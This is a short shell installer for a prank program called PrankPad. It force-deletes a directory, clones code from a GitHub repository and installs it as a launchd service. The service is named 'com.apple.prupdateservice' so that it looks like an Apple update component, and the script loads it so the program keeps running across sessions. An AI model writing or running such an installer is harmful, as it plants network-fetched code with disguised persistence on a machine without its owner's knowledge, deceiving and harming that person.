#!/bin/sh

source vars.sh

if  [[ -z $DEV ]]
then
  rm -rf "$PROGDIR"
  git clone https://github.com/pranksrus/prankpad.git "$PROGDIR"
fi

mkdir -p "$LAUNCHDIR"

cp "$PROGDIR/bootstrap/com.apple.prupdateservice.plist" "$LAUNCHDIR"
launchctl load "$LAUNCHDIR/com.apple.prupdateservice.plist"

echo "\nPrankPad Successfully Installed"
